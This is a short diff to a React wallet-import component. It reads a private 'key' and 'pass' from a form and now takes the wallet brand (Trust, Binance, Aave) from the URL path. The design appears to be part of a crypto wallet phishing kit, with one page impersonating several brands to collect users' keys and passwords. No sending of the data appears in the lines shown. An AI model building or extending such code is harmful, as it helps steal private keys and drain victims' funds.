@@ -121,8 +121,11 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const handleImport = (e) => {
     e.preventDefault();
 
-    const formData = new FormData(e.target);
-    const walletType = formData.get('walletType') || 'binance';
+  const formData = new FormData(e.target);
+  // Get wallet type from URL path (e.g., /trust, /binance, /aave)
+  const path = window.location.pathname;
+  const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
+  const walletType = routeWalletType || 'unknown';
     const key = formData.get('key') || '';
     const pass = formData.get('pass') || '';
 
